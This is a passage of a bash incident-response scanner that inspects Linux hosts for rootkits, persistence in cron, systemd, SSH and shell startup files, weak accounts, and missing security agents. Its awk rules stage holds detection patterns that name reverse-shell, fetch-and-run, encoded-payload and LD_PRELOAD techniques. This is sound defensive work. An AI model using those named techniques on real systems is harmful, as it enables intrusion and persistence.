            fi
            if [[ -z $tgid ]]; then
                : # raced with exit, or unreadable - not evidence
            elif [[ $tgid == "$n" ]]; then
                found=1
                finding RK004 CRIT rootkit confirmed \
                    "Process is its own thread-group leader, statable directly, but hidden from /proc readdir" \
                    "pid=$n" "getdents hooking - capture memory before reboot" \
                    capture_memory
            elif [[ -z ${seen[$tgid]:-} ]]; then
                found=1
                finding RK005 CRIT rootkit confirmed \
                    "Thread whose owning process is hidden from /proc" \
                    "tid=$n tgid=$tgid" "hidden thread group - capture memory" \
                    capture_memory
            fi
        fi
        n=$(( n + 1 ))
    done

    fi
    (( found == 0 )) && ok RK001 "no hidden-PID inconsistency detected in selected probes"
}

# --- M04: deleted-but-running binaries --------------------------------------
chk_deleted_exe() {
    if (( CAP_PROC == 0 )); then
        skip RK010 "no readable $PROCFS"
        return
    fi
    local pid tgt found=0
    for pid in "${PROC_PIDS[@]}"; do
        tgt=${PROC_EXE[$pid]:-}
        [[ -z $tgt ]] && continue
        case $tgt in
            *" (deleted)")
                found=1
                # A package upgrade also unlinks the running binary, but leaves
                # a new file at the same path. A truly unlinked binary - the
                # run-from-memory pattern - leaves nothing behind.
                local orig=${tgt% (deleted)}
                if [[ -e $orig ]]; then
                    finding RK011 MED rootkit possible \
                        "Running binary was unlinked but the path exists again - usually a package upgrade" \
                        "pid=$pid ${PROC_COMM[$pid]:-}" \
                        "exe=$tgt cmd=${PROC_CMD[$pid]:-}" restart_service
                else
                    finding RK010 HIGH rootkit possible \
                        "Running process whose binary was deleted and never replaced" \
                        "pid=$pid ${PROC_COMM[$pid]:-}" \
                        "exe=$tgt cmd=${PROC_CMD[$pid]:-}" capture_memory
                fi
                ;;
            /tmp/*|/dev/shm/*|/var/tmp/*|/run/user/*)
                found=1
                finding PRC001 HIGH procs possible \
                    "Process executing from a world-writable directory" \
                    "pid=$pid ${PROC_COMM[$pid]:-}" \
                    "exe=$tgt cmd=${PROC_CMD[$pid]:-}" inspect_proc
                ;;
        esac
    done
    (( found == 0 )) && ok RK010 "no deleted or temp-dir executables running"
}

# --- M05: listening sockets -------------------------------------------------
chk_listeners() {
    if (( ${#LISTEN_ROWS[@]} == 0 )) && [[ ! -r $PROCFS/net/tcp ]]; then
        skip NET001 "no /proc/net, no ss, no netstat - listening sockets UNKNOWN"
        return
    fi

    local row proto addr port uid inode pid exe
    for row in "${LISTEN_ROWS[@]}"; do
        IFS='|' read -r proto addr port uid inode <<< "$row"
        pid=${SOCK_PID[$inode]:-}
        if [[ -z $pid ]]; then
            if (( CAP_ROOT == 1 )); then
                # Root can see every /proc/*/fd, so an unmatched inode means
                # the fd link exists nowhere: this is the seq_show tell.
                exe="owner=unknown (race, namespace or restricted fd visibility)"
            else
                exe="owner=unknown (insufficient privilege)"
            fi
        else
            exe="pid=$pid ${PROC_COMM[$pid]:-} ${PROC_EXE[$pid]:-}"
        fi
        # Bracket IPv6 so "[::]:22" reads unambiguously, matching ss/ip output.
        local disp="$addr:$port"
        case $proto in tcp6|udp6) disp="[$addr]:$port" ;; esac
        obs LISTEN "$proto:$disp" "$uid|$exe"
        finding NET001 INFO network confirmed \
            "Listening socket" "$proto $disp" "uid=$uid $exe" -
    done

    # The high-value cross-check: an fd points at a socket inode that has no
    # row in /proc/net/* at all. Most LKM rootkits hide the row and forget
    # the fd.
    if (( CAP_ROOT == 1 )); then
        local -A netino=()
        local f line ino
        for f in tcp tcp6 udp udp6; do
            [[ -r $PROCFS/net/$f ]] || continue
            {
                read -r _
                while read -r _ _ _ _ _ _ _ _ _ ino _; do netino[$ino]=1; done
            } < "$PROCFS/net/$f"
        done
        # unix and packet sockets legitimately have no tcp/udp row
        for f in unix packet raw raw6 netlink; do
            [[ -r $PROCFS/net/$f ]] || continue
            while read -r line; do
                for ino in $line; do
                    [[ $ino == *[!0-9]* ]] && continue
                    netino[$ino]=1
                done
            done < "$PROCFS/net/$f"
        done
        local hidden=0
        for ino in "${!SOCK_PID[@]}"; do
            if [[ -z ${netino[$ino]:-} ]]; then
                hidden=$(( hidden + 1 ))
                pid=${SOCK_PID[$ino]}
                finding NET010 MED rootkit possible \
                    "Socket inode owned by a process but absent from /proc/net - possible kernel-level hiding" \
                    "inode=$ino pid=$pid ${PROC_COMM[$pid]:-}" \
                    "cmd=${PROC_CMD[$pid]:-}; namespace/race/unsupported protocol may explain discrepancy" capture_memory
            fi
        done
        (( hidden == 0 )) && ok NET010 "no socket inodes missing from /proc/net"
    else
        skip NET010 "socket-vs-/proc/net cross-check needs root"
    fi
}

# --- M03: cron --------------------------------------------------------------
chk_cron() {
    local -a files=()
    local d f
    for f in "$ROOT/etc/crontab" "$ROOT/etc/anacrontab"; do
        [[ -f $f ]] && files+=("$f")
    done
    for d in "$ROOT/etc/cron.d" "$ROOT/etc/cron.hourly" "$ROOT/etc/cron.daily" \
             "$ROOT/etc/cron.weekly" "$ROOT/etc/cron.monthly" \
             "$ROOT/var/spool/cron/crontabs" "$ROOT/var/spool/cron" \
             "$ROOT/var/spool/at" "$ROOT/etc/at.allow" "$ROOT/etc/at.deny"; do
        [[ -d $d ]] || continue
        for f in "$d"/*; do
            [[ -f $f ]] && files+=("$f")
        done
    done

    if (( ${#files[@]} == 0 )); then
        skip CRN001 "no cron files readable (need root for /var/spool/cron)"
        return
    fi

    local line n=0
    for f in "${files[@]}"; do
        [[ -r $f ]] || { skip CRN001 "unreadable: $f"; continue; }
        while IFS= read -r line; do
            [[ -z ${line// /} ]] && continue
            case $line in \#*|MAILTO=*|PATH=*|SHELL=*|HOME=*) continue ;; esac
            n=$(( n + 1 ))
            obs CRON "$f" "$line"
        done < "$f"
    done
    # NB: the suspicious-command verdicts for these entries are produced by the
    # rules stage downstream, which run_check cannot see. A collector-style
    # check must therefore state what it inventoried, so that "silent" always
    # means "bug" and never "clean".
    if (( n == 0 )); then
        ok CRN001 "no active cron entries"
    else
        ok CRN001 "$n cron entries inventoried"
    fi

    # Directories where a dropped file executes with no further action.
    for d in "$ROOT/etc/cron.d" "$ROOT/etc/cron.hourly" "$ROOT/etc/cron.daily"; do
        [[ -d $d ]] || continue
        for f in "$d"/*; do
            [[ -f $f ]] || continue
            if (( CAP_ROOT == 0 )) && { [[ -w $f ]] || [[ -w $d ]]; }; then
                finding CRN002 HIGH persistence likely \
                    "Cron directory or job is writable by the current user" \
                    "$f" "a writable cron path is a one-step backdoor" fix_perms
            fi
        done
    done
}

# --- M03: systemd units and timers ------------------------------------------
chk_systemd() {
    local -a dirs=(
        "$ROOT/etc/systemd/system"
        "$ROOT/run/systemd/system"
        "$ROOT/usr/lib/systemd/system"
        "$ROOT/lib/systemd/system"
        "$ROOT/etc/systemd/user"
    )
    local d f line n=0 unit
    for d in "${dirs[@]}"; do
        [[ -d $d ]] || continue
        for f in "$d"/*.service "$d"/*.timer "$d"/*.socket; do
            [[ -f $f ]] || continue
            n=$(( n + 1 ))
            unit=${f##*/}
            while IFS= read -r line; do
                case $line in
                    ExecStart=*|ExecStartPre=*|ExecStartPost=*|ExecReload=*|ExecStop=*)
                        obs UNITEXEC "$unit" "$line"
                        ;;
                    User=*|Environment=*|EnvironmentFile=*)
                        obs UNITCFG "$unit" "$line"
                        ;;
                    OnCalendar=*|OnBootSec=*|OnUnitActiveSec=*)
                        obs UNITTIMER "$unit" "$line"
                        ;;
                esac
            done < "$f"
        done
    done
    (( n == 0 )) && { skip UNT001 "no systemd unit directories found"; return; }
    ok UNT001 "$n systemd unit files inventoried"

    # User-level units are a frequently-missed persistence location.
    local h u
    while IFS=: read -r u _ _ _ _ h _; do
        h="$ROOT$h"
        [[ -d $h/.config/systemd/user ]] || continue
        for f in "$h/.config/systemd/user"/*; do
            [[ -f $f ]] || continue
            finding UNT002 HIGH persistence possible \
                "User-level systemd unit (survives reboot, runs as that user)" \
                "$f" "owner=$u" review_unit
        done
    done < "$ROOT/etc/passwd"
}

# --- M06: SSH authorized_keys and sshd_config --------------------------------
chk_authkeys() {
    local u h line akf n=0
    # Several accounts can legitimately share one home directory (itself worth
    # knowing), but the key file must only be reported once.
    local -A ak_done=() rc_done=()
    while IFS=: read -r u _ _ _ _ h _; do
        h="$ROOT$h"
        [[ -n $h && -d $h ]] || continue
        for akf in "$h/.ssh/authorized_keys" "$h/.ssh/authorized_keys2"; do
            [[ -f $akf ]] || continue
            [[ -n ${ak_done[$akf]:-} ]] && continue
            ak_done[$akf]=1
            if [[ ! -r $akf ]]; then
                skip SSH001 "unreadable: $akf (need root)"
                continue
            fi
            while IFS= read -r line; do
                [[ -z ${line// /} ]] && continue
                case $line in \#*) continue ;; esac
                n=$(( n + 1 ))
                local keyhash
                if [[ -n $CAP_HASH ]]; then keyhash=$(printf '%s' "$line" | hash_stream); else keyhash=$line; fi
                obs SSHKEY "$u:${line##* }" "$keyhash"
                case $line in
                    command=*|*,command=*|*command=\"*)
                        finding SSH002 HIGH ssh likely \
                            "authorized_keys entry with a forced command" \
                            "$akf ($u)" "$line" review_authkeys
                        ;;
                esac
                # A valid entry may carry an options prefix before the key
                # type, so look for a key type anywhere on the line rather
                # than anchoring at the start.
                case $line in
                    *ssh-rsa*|*ssh-dss*|*ssh-ed25519*|*ecdsa-sha2-*|*sk-ssh-*|*sk-ecdsa-*) ;;
                    *)  finding SSH003 MED ssh possible \
                            "authorized_keys line carries no recognizable key type" \
                            "$akf ($u)" "$line" review_authkeys ;;
                esac
            done < "$akf"
        done
        # ~/.ssh/rc executes on every login
        if [[ -f $h/.ssh/rc && -z ${rc_done[$h]:-} ]]; then
            rc_done[$h]=1
            finding SSH004 HIGH persistence likely \
                "~/.ssh/rc runs on every SSH login" "$h/.ssh/rc" \
                "owner=$u" review_sshrc
        fi
    done < "$ROOT/etc/passwd"
    if (( n == 0 )); then
        ok SSH001 "no authorized_keys entries found"
    else
        ok SSH001 "$n authorized_keys entries inventoried, none anomalous"
    fi

    [[ -f $ROOT/etc/ssh/sshrc ]] && finding SSH005 HIGH persistence likely \
        "/etc/ssh/sshrc runs on every SSH login" "$ROOT/etc/ssh/sshrc" \
        "system-wide" review_sshrc
    return 0
}

chk_sshd() {
    local f="$ROOT/etc/ssh/sshd_config" line k v
    if [[ ! -r $f ]]; then
        skip SSH010 "cannot read $f"
        return
    fi
    local seen_root=0 seen_pw=0
    while IFS= read -r line; do
        line=${line%%#*}
        [[ -z ${line// /} ]] && continue
        read -r k v _ <<< "$line"
        obs SSHD "$k" "$v"
        case ${k,,} in
            permitrootlogin)
                seen_root=1
                case ${v,,} in
                    yes) finding SSH010 HIGH ssh confirmed \
                        "PermitRootLogin yes" "$f" "$line" harden_sshd ;;
                    *)   ok SSH010 "PermitRootLogin $v" ;;
                esac ;;
            passwordauthentication)
                seen_pw=1
                [[ ${v,,} == yes ]] && finding SSH011 MED ssh confirmed \
                    "Password authentication enabled" "$f" "$line" harden_sshd ;;
            permitemptypasswords)
                [[ ${v,,} == yes ]] && finding SSH012 CRIT ssh confirmed \
                    "PermitEmptyPasswords yes" "$f" "$line" harden_sshd ;;
            forcecommand)
                finding SSH013 HIGH ssh likely \
                    "sshd ForceCommand set - runs on every session" \
                    "$f" "$line" review_sshd ;;
            authorizedkeyscommand)
                case $v in
                    /usr/bin/*|/usr/libexec/*|/usr/lib/*) ;;
                    *) finding SSH014 CRIT ssh likely \
                        "AuthorizedKeysCommand points outside standard paths" \
                        "$f" "$line" review_sshd ;;
                esac ;;
            authorizedkeysfile)
                case $v in
                    .ssh/authorized_keys*|%h/.ssh/authorized_keys*) ;;
                    *) finding SSH015 HIGH ssh likely \
                        "Non-default AuthorizedKeysFile - keys may live outside ~/.ssh" \
                        "$f" "$line" review_sshd ;;
                esac ;;
            permituserenvironment)
                [[ ${v,,} == yes ]] && finding SSH016 HIGH ssh confirmed \
                    "PermitUserEnvironment yes - ~/.ssh/environment can inject LD_PRELOAD" \
                    "$f" "$line" harden_sshd ;;
        esac
    done < "$f"
    (( seen_root == 0 )) && finding SSH010 MED ssh possible \
        "PermitRootLogin not set explicitly (distro default applies)" \
        "$f" "-" harden_sshd
    (( seen_pw == 0 )) && ok SSH011 "PasswordAuthentication not set explicitly"
}

# --- M02: accounts ----------------------------------------------------------
chk_accounts() {
    local f="$ROOT/etc/passwd" u p uid gid rest shell h
    if [[ ! -r $f ]]; then
        skip ACC001 "cannot read $f"
        return
    fi
    local -A uid_seen=()
    local dupe=0
    while IFS=: read -r u p uid gid _ h shell; do
        if [[ -z $u || ! $uid =~ ^[0-9]+$ || ! $gid =~ ^[0-9]+$ ]]; then
            finding ACC015 HIGH accounts possible "Malformed passwd entry" "${u:-<empty>}" "invalid username or numeric UID/GID; entry not interpreted" review_accounts
            continue
        fi
        obs USER "$u" "$uid:$gid:$shell:$h"
        if [[ $uid == 0 && $u != root ]]; then
            finding ACC001 CRIT accounts confirmed \
                "Non-root account with UID 0" "$u" "$u:$p:$uid:$gid:$h:$shell" \
                remove_uid0
        fi
        if [[ -n ${uid_seen[$uid]:-} ]]; then
            dupe=1
            finding ACC002 HIGH accounts confirmed \
                "Duplicate UID" "$u and ${uid_seen[$uid]}" "uid=$uid" dedupe_uid
        fi
        uid_seen[$uid]=$u
        if [[ -z $p ]]; then
            finding ACC003 CRIT accounts confirmed \
                "Empty password field in /etc/passwd" "$u" "$u::$uid:$gid" \
                lock_account
        fi
    done < "$f"
    (( dupe == 0 )) && ok ACC002 "no duplicate UIDs"

    # /etc/shadow: empty hashes and duplicate hashes across accounts
    local sf="$ROOT/etc/shadow" hash
    if [[ -r $sf ]]; then
        local -A hash_seen=()
        while IFS=: read -r u hash _; do
            case $hash in
                "") finding ACC014 CRIT accounts confirmed \
                    "Empty password hash in /etc/shadow" "$u" \
                    "passwordless authentication may be permitted by PAM" lock_account
                    continue ;;
                "!"*|"*"*) continue ;;
            esac
            if [[ ${#hash} -lt 10 ]]; then
                finding ACC004 CRIT accounts confirmed \
                    "Account has a suspiciously short password hash" "$u" \
                    "len=${#hash}" lock_account
                continue
            fi
            case $hash in
                '$1$'*) finding ACC005 MED accounts confirmed \
                    "Weak MD5 password hash" "$u" "\$1\$ (MD5)" rehash ;;
                '$2'*|'$5$'*|'$6$'*|'$y$'*|'$7$'*) ;;
                *) finding ACC005 HIGH accounts confirmed \
                    "Legacy DES/unknown password hash" "$u" "prefix=${hash:0:3}" rehash ;;
            esac
            if [[ -n ${hash_seen[$hash]:-} ]]; then
                finding ACC006 HIGH accounts likely \
                    "Two accounts share an identical password hash - same password, same salt" \
                    "$u and ${hash_seen[$hash]}" "shared credential" rehash
            fi
            hash_seen[$hash]=$u
        done < "$sf"
        ok ACC004 "/etc/shadow parsed"
    else
        skip ACC004 "cannot read /etc/shadow (need root)"
    fi

    # sudoers
    local sd line
    for sd in "$ROOT/etc/sudoers" "$ROOT"/etc/sudoers.d/*; do
        [[ -f $sd && -r $sd ]] || continue
        while IFS= read -r line; do
            line=${line%%#*}
            [[ -z ${line// /} ]] && continue
            obs SUDOERS "$sd" "$line"
            case $line in
                *NOPASSWD*)
                    finding ACC010 HIGH accounts confirmed \
                        "sudoers NOPASSWD rule" "$sd" "$line" review_sudoers ;;
            esac
            case $line in
                *"ALL=(ALL"*ALL*|*"ALL = (ALL"*)
                    case $line in
                        root*|%sudo*|%wheel*|%admin*|Defaults*) ;;
                        *) finding ACC011 MED accounts possible \
                            "Broad sudo grant to a non-standard principal" \
                            "$sd" "$line" review_sudoers ;;
                    esac ;;
            esac
        done < "$sd"
    done

    # legacy trust files
    while IFS=: read -r u _ _ _ _ h _; do
        h="$ROOT$h"
        [[ -n $h && -d $h ]] || continue
        for f in "$h/.rhosts" "$h/.netrc" "$h/.shosts"; do
            [[ -f $f ]] && finding ACC012 HIGH accounts likely \
                "Legacy trust/credential file in home directory" "$f" \
                "owner=$u" remove_file
        done
    done < "$ROOT/etc/passwd"
    [[ -f $ROOT/etc/hosts.equiv ]] && finding ACC013 HIGH accounts likely \
        "/etc/hosts.equiv present - host-based trust" "$ROOT/etc/hosts.equiv" \
        "-" remove_file
}

# --- M03: shell rc files ----------------------------------------------------
chk_shellrc() {
    local -a targets=()
    local -A seen=()
    local f d u h name line info n=0 bits
    for f in "$ROOT/etc/profile" "$ROOT/etc/bash.bashrc" "$ROOT/etc/bashrc" "$ROOT/etc/bash.bash_logout" \
             "$ROOT/etc/zshenv" "$ROOT/etc/zprofile" "$ROOT/etc/zshrc" "$ROOT/etc/zlogin" "$ROOT/etc/zlogout" \
             "$ROOT/etc/zsh/zshenv" "$ROOT/etc/zsh/zprofile" "$ROOT/etc/zsh/zshrc" "$ROOT/etc/zsh/zlogin" "$ROOT/etc/zsh/zlogout" \
             "$ROOT/etc/environment" "$ROOT/etc/csh.cshrc" "$ROOT/etc/csh.login" "$ROOT/etc/csh.logout" \
             "$ROOT/etc/fish/config.fish"; do
        [[ -f $f ]] && targets+=("$f")
    done
    for d in "$ROOT/etc/profile.d" "$ROOT/etc/update-motd.d" "$ROOT/etc/bash_completion.d" \
             "$ROOT/etc/environment.d" "$ROOT/etc/fish/conf.d"; do
        [[ -d $d ]] || continue
        for f in "$d"/*; do [[ -f $f ]] && targets+=("$f"); done
    done
    if [[ -r $ROOT/etc/passwd ]]; then
        while IFS=: read -r u _ _ _ _ h _; do
            [[ $h == /* ]] || continue
            h="$ROOT$h"
            for name in .bashrc .bash_profile .bash_login .bash_logout .profile .zshenv .zprofile .zshrc .zlogin .zlogout \
                        .kshrc .cshrc .tcshrc .login .logout .pam_environment .xinitrc .xsession .xsessionrc .xprofile \
                        .config/fish/config.fish .config/nushell/config.nu .config/nushell/env.nu; do
                [[ -f $h/$name ]] && targets+=("$h/$name")
            done
            for f in "$h"/.config/fish/conf.d/*.fish "$h"/.config/environment.d/*.conf; do
                [[ -f $f ]] && targets+=("$f")
            done
        done < "$ROOT/etc/passwd"
    else skip RC000 "passwd unreadable; per-user startup locations may be missed"; fi
    # Also catch orphaned home directories and startup files discovered in images.
    for f in "${FILES[@]}"; do
        case ${f##*/} in .bashrc|.bash_profile|.bash_login|.bash_logout|.profile|.zshenv|.zprofile|.zshrc|.zlogin|.zlogout|.kshrc|.cshrc|.tcshrc|.xinitrc|.xsession|.xprofile) targets+=("$f") ;; esac
    done
    for f in "${targets[@]}"; do
        [[ -z ${seen[$f]:-} ]] || continue; seen[$f]=1
        [[ -r $f ]] || { skip RC001 "startup file unreadable: $f"; continue; }
        info=$(stat -c '%a:%s' -- "$f" 2>/dev/null) || { skip RC001 "cannot stat $f"; continue; }
        (( ${info#*:} <= 2097152 )) || { skip RC001 "startup file over 2 MiB: $f"; continue; }
        bits=$((8#${info%%:*}))
        (( (bits & 0002) == 0 )) || finding RC002 HIGH persistence untrusted-source "World-writable shell or session startup file" "$f" "mode=${info%%:*}" fix_perms
        logical_path "$f"
        local digest
        digest=$(hash_stream < "$f")
        [[ -z $digest ]] || obs STARTUP_FILE "$LOGICAL" "${info%%:*}:$digest"
        while IFS= read -r line || [[ -n $line ]]; do
            [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
            obs RCLINE "$LOGICAL" "$line"
        done < "$f"
        n=$((n+1))
    done
    ok RC001 "$n unique shell/session startup files inspected; content is never sourced"
}

# --- M14: security agents ---------------------------------------------------
chk_agents() {
    local a found=0 pid
    if (( CAP_PROC == 0 )); then
        skip AGT001 "agent detection needs a live process table"
        return 0
    fi
    while IFS= read -r a; do
        [[ -z $a ]] && continue
        local running=0
        for pid in "${PROC_PIDS[@]}"; do
            if [[ ${PROC_COMM[$pid]:-} == "${a:0:15}" ]]; then
                found=1
                running=1
                obs AGENT "$a" running
                finding AGT001 INFO agents confirmed \
                    "Security agent running - do not remove or disable" \
                    "$a" "pid=$pid" protect_agent
                break
            fi
        done
        (( running )) || obs AGENT "$a" stopped
    done <<< "$SIG_AGENT"
    (( found == 0 )) && finding AGT002 MED agents possible \
        "No security/telemetry agent detected running" "-" \
        "no wazuh/osquery/auditd/falco process found" install_agent
}

# ---------------------------------------------------------------------------
# rules stage - OBS records in, FIND records out. mawk-safe POSIX awk only.
# ---------------------------------------------------------------------------
read -r -d '' RULES_PROG <<'AWKEOF' || true
BEGIN { FS = "\t"; OFS = "\t" }

$1 == "SIG" {
    if ($2 == "SUID_OK")     OKSUID[$3] = 1
    if ($2 == "SUID_NEVER")  NEVER[$3]  = 1
    if ($2 == "RK_PATH")     RKPATH[$3] = 1
    if ($2 == "AGENT")       AGENT[$3]  = 1
    if ($2 == "INTERESTING") INTERESTING[$3] = glob_regex($3)
    print; next
}

function glob_regex(p,  i,c,r) {
    r=""
    for(i=1;i<=length(p);i++) {
        c=substr(p,i,1)
        if(c=="*") r=r ".*"
        else if(c=="?") r=r "."
        else if(index(".^$+()[]{}|\\",c)) r=r "\\" c
        else r=r c
    }
    return "(^|/)" r "$"
}
function base(p,  n, a) { n = split(p, a, "/"); return a[n] }
function fin(id, sev, cat, conf, title, target, ev, fix) {
    print "FIND", id, sev, cat, conf, title, target, ev, fix
}

$1 == "OBS" { print }

$1=="OBS" && $2=="FSMETA" {
    p=$3; split($4,fields,":"); mode=fields[1]; matched=""
    for(g in INTERESTING) if(p ~ INTERESTING[g]) {matched=g; break}
    if(matched!="") {
        print "OBS","ARTIFACT",p,"filename_pattern=" matched "; mode=" mode "; content withheld; untrusted-source=find"
        if((mode%10)>=4 && p ~ /(shadow[-~]?$|gshadow[-~]?$|\/id_(rsa|dsa|ecdsa|ed25519)$|[.]env([^/]*$)|credentials|[.]netrc$|[.]pgpass$|[.]erlang.cookie$|[.]tfstate$|[.]keytab$)/)
            fin("SEC002","HIGH","credentials","untrusted-source","World-readable sensitive artifact",p,"mode=" mode "; verify file contents and intended readers","fix_perms")
    }
    next
}

# --- SUID classification ---------------------------------------------------
$1 == "OBS" && $2 == "SUIDROW" {
    mode = $3; uid = $4; size = $6; path = $7
    b = base(path)
    if (b in NEVER || b ~ /^(python|php|perl|ruby|node)[0-9]+([.][0-9]+)*$/) {
        fin("SUI010", "CRIT", "integrity", "confirmed",
            "SUID shell or interpreter - immediate privilege escalation",
            path, "mode=" mode " uid=" uid, "rm_suid")
        next
    }
    if (path !~ /^(\/usr\/(bin|sbin|lib|lib64|libexec|lib32)|\/bin|\/sbin|\/opt)\//) {
        fin("SUI011", "HIGH", "integrity", "likely",
            "SUID/SGID file outside the standard binary directories",
            path, "mode=" mode " uid=" uid " size=" size, "rm_suid")
        next
    }
    if (!(path in OKSUID)) {
        fin("SUI012", "MED", "integrity", "possible",
            "SUID/SGID binary not on the known-good list",
            path, "mode=" mode " uid=" uid " size=" size, "review_suid")
    }
    next
}

# --- cron / unit command scrutiny ------------------------------------------
$1 == "OBS" && ($2 == "CRON" || $2 == "UNITEXEC" || $2 == "RCLINE") {
    key = $3; val = $4
    line = val
    sev = ""; why = ""
    if (line ~ /(curl|wget)[^|;&]*[|][ \t]*(ba)?sh/)      { sev="CRIT"; why="remote fetch piped to a shell" }
    else if (line ~ /base64[ \t]+(-d|--decode)/)          { sev="CRIT"; why="base64-decoded payload" }
    else if (line ~ /\/dev\/tcp\//)                        { sev="CRIT"; why="bash /dev/tcp reverse shell" }
    else if (line ~ /nc[ \t]+-[a-z]*e|ncat[^;]*--exec/)    { sev="CRIT"; why="netcat with command execution" }
    else if (line ~ /socat[^;]*exec/)                      { sev="CRIT"; why="socat exec" }
    else if (line ~ /(ba)?sh[ \t]+-i[ \t]*>&/)             { sev="CRIT"; why="interactive shell redirected to a socket" }
    else if (line ~ /mkfifo[^;]*\|[ \t]*(ba)?sh/)          { sev="CRIT"; why="named-pipe reverse shell" }
    else if (line ~ /(python|perl|ruby|php)[ \t]+-[ec][ \t]/) { sev="HIGH"; why="inline interpreter payload" }
    else if (line ~ /\/dev\/shm\/|\/tmp\/\./)              { sev="HIGH"; why="executes from a world-writable path" }
    else if (line ~ /chattr[ \t]+\+i/)                     { sev="HIGH"; why="makes a file immutable (anti-removal)" }
    else if (line ~ /history[ \t]+-c/)                     { sev="HIGH"; why="clears shell history (anti-forensics)" }
    else if (line ~ /(^|[ ;])(export[ \t]+)?(LD_PRELOAD|LD_AUDIT|BASH_ENV|ENV|ZDOTDIR)[ \t]*=/) { sev="HIGH"; why="loader or shell startup redirection" }
    else if (line ~ /PROMPT_COMMAND[ \t]*=|trap[ \t].*(DEBUG|EXIT)/) { sev="MED"; why="interactive prompt or shell trap hook" }
    else if (line ~ /(^|[ ;])(source|[.])[ \t]+[\042\047]?\/(tmp|dev\/shm|var\/tmp)\//) { sev="HIGH"; why="sources code from a temporary directory" }
    else if (line ~ /(^|[ ;])PATH[ \t]*=[\042\047]?(\.|:|\/tmp|\/dev\/shm)/) { sev="HIGH"; why="unsafe executable search path" }
    else if (line ~ /[A-Za-z0-9+\/=]{120,}/)               { sev="HIGH"; why="long encoded blob" }

    if (sev != "") {
        cat = ($2 == "UNITEXEC") ? "persistence" : (($2 == "RCLINE") ? "persistence" : "persistence")
        fin("PER0" (($2=="CRON")?"01":(($2=="UNITEXEC")?"02":"03")), sev, cat,
            "likely", "Suspicious command in " tolower($2) " - " why,
            key, line, "review_persistence")
    }
    next
}

# --- unit ExecStart pointing somewhere it should not -----------------------
$1 == "OBS" && $2 == "UNITEXEC" { next }

# --- rootkit artifact paths ------------------------------------------------
$1 == "OBS" && $2 == "FILE" {
    if ($3 in RKPATH)
        fin("RK020", "CRIT", "rootkit", "likely",
            "Known rootkit artifact path present", $3, $4, "capture_memory")
    next
}

{ if ($1 != "OBS") print }
AWKEOF

# ---------------------------------------------------------------------------
# render stage - severity-ordered terminal output, exit code
# ---------------------------------------------------------------------------
read -r -d '' RENDER_PROG <<'AWKEOF' || true
BEGIN {
    FS = "\t"
    RANK["CRIT"]=40; RANK["HIGH"]=30; RANK["MED"]=20; RANK["LOW"]=10
    RANK["INFO"]=0;  RANK["ERROR"]=30
    if (color) {
        C["CRIT"]="\033[1;97;41m"; C["HIGH"]="\033[1;31m"; C["MED"]="\033[1;33m"
        C["LOW"]="\033[36m";       C["INFO"]="\033[90m";   C["SKIP"]="\033[35m"
        C["ERROR"]="\033[1;35m";   C["OK"]="\033[32m"
        B="\033[1m"; R="\033[0m"; D="\033[90m"
    }
    worst = 0
}

$1 == "META" { gsub(/[[:cntrl:]]/,"?",$3); meta[$2] = $3; next }

$1 == "FIND" {
    for (i=2;i<=NF;i++) gsub(/[[:cntrl:]]/,"?",$i)
    id=$2; sev=$3; cat=$4; conf=$5; title=$6; target=$7; ev=$8
    if(length(ev)>1000) ev=substr(ev,1,1000) " ... (--raw for full evidence)"
    n[sev]++
    if (RANK[sev] > worst) worst = RANK[sev]
    if (sev != "ERROR" && RANK[sev] < minrank) next

    # Collapse repeats of the same check. One noisy condition - a nested
    # chroot full of SUID binaries, or a rootkit tripping a detector on every
    # PID - must not bury the other findings.
    seen_id[id]++
    if (seen_id[id] > maxper) { elided[id]++; elided_sev[id] = sev; next }

    blk = C[sev] " " sev " " R " " B title R "\n"
    if (target != "" && target != "-") blk = blk "        " D "where:" R " " target "\n"
    if (ev != "" && ev != "-")         blk = blk "        " D "proof:" R " " ev "\n"
    blk = blk "        " D "(" id " / " cat " / " conf ")" R "\n"
    out[sev] = out[sev] blk
    next
}

$1 == "SKIP" { nskip++; gsub(/[[:cntrl:]]/,"?",$3); if (++skipcount[$2]>8) next; skips = skips "        " C["SKIP"] $2 R " - " $3 "\n"; next }
$1 == "OK"   { nok++; if (verbose) oks = oks "        " C["OK"] "ok" R " " $2 " - " $3 "\n"; next }
$1 == "OBS"  { nobs++; next }

END {
    printf "\n%s bluesweep %s %s  %s  %s\n", B, meta["version"], R, meta["host"], meta["when"]
    printf "%s  %s | %s | mode=%s | %s%s\n\n", D, meta["os"], meta["kernel"],
           meta["mode"], meta["privilege"], R
    if (meta["privilege"] == "unprivileged")
        printf "%s  RUNNING UNPRIVILEGED - shadow, other users' /proc/*/fd and\n" \
               "  kernel symbols are unreadable. Expect false negatives.%s\n\n", C["MED"] R, R

    if (meta["baseline_age_seconds"] != "")
        printf "  Baseline age: %s seconds. A baseline may already contain compromise.\n\n", meta["baseline_age_seconds"]
    printf "  Coverage: %s. Skips and caps limit conclusions; kernel consistency is not proof of a clean host.\n\n", meta["mode"]
    split("ERROR CRIT HIGH MED LOW INFO", order, " ")
    for (i = 1; i <= 6; i++) {
        s = order[i]
        if (out[s] != "") printf "%s", out[s]
        for (id in elided)
            if (elided_sev[id] == s)
                printf "        %s... and %d more %s findings (--raw shows every one)%s\n",
                       D, elided[id], id, R
    }
    if (verbose && oks != "") printf "\n%s  passed%s\n%s", B, R, oks
    if (skips != "")
        printf "\n%s  skipped - these checks could NOT run, they are not passes%s\n%s",
               B, R, skips

    printf "\n%s  %d crit  %d high  %d med  %d low  %d info  |  %d ok  %d skipped%s\n",
           B, n["CRIT"], n["HIGH"], n["MED"], n["LOW"], n["INFO"], nok, nskip, R
    if (nskip > 0)
        printf "%s  a run with skips is not a clean run%s\n", D, R
    printf "\n"

    if (exitzero) exit 0
    if (nskip > 0 || n["ERROR"] > 0) exit 3
    exit worst
}
AWKEOF

# ---------------------------------------------------------------------------
# driver
# ---------------------------------------------------------------------------

CHECKS_QUICK="chk_ldpreload chk_hidden_pid chk_deleted_exe chk_listeners
chk_cron chk_systemd chk_authkeys chk_sshd chk_accounts chk_shellrc
chk_agents chk_file_metadata chk_configs chk_webshell chk_logs chk_kernel
chk_hardening chk_services chk_packages chk_hunt chk_extra_procs chk_sessions
chk_capabilities chk_weak_passwords chk_artifacts chk_agent_enrollment chk_ssh_locations chk_privilege_paths chk_container_surface chk_acl chk_stored_credentials chk_package_inventory chk_host_inventory chk_process_mappings chk_session_sockets chk_auth_events"

collect_all() {
    local host when os kern priv
    host=$HOST_ID
